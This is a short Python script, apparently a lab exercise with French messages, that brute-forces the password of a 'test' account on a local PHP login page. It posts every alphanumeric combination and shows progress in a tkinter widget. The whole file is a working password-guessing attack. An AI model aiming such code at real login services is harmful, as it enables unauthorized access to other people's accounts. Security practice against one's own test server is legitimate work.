import itertools
import threading
import time
import requests
from tkinter import END

MAX_PASSWORD_LENGTH = 64
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

url = 'http://localhost:8000/index.php'


def guess_password(real, password_display):
    def update_display(message):
        password_display.insert(END, message)
        password_display.see(END)
        password_display.update_idletasks()

    def run():
        attempts = 0
        start_time = time.perf_counter()
        try:
            for password_length in range(4, MAX_PASSWORD_LENGTH):
                for guess in itertools.product(CHARS, repeat=password_length):
                    attempts += 1
                    guess = ''.join(guess)

                    data = {
                        'username': 'test',
                        'password': guess,
                        'submit': 'submit',
                    }

                    response = requests.post(url, data=data)

                    response_url = response.url

                    print(guess)
                    print(response.content)
                    if response.content == b'Connexion reussie<br />\n<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:27) in <b>/var/www/html/index.php</b> on line <b>28</b><br />\n':
                        end_time = time.perf_counter()
                        time_taken = round(end_time - start_time, 3)
                        result = f'\n\nLe mot de passe est {guess}. \nTrouvé après {attempts} tentatives. \nDurée: {time_taken} secondes.\n'
                        update_display(result)
                        return
                    update_display(f'{guess}\n')
        finally:
            if attempts == 0:
                update_display("Finis le MDP n'a pas été trouvé\n")
            else:
                update_display(f'Finis après {attempts} tentatives\n')

    thread = threading.Thread(target=run)
    thread.start()